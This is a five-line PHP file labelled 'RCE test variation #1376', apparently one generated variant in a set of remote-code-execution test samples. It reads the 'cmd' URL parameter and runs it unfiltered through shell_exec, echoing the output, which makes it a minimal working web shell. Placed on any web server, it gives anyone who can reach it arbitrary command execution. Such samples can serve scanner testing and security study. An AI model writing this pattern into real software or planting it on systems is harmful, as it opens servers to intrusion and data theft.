<?php
// RCE test variation #1376
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>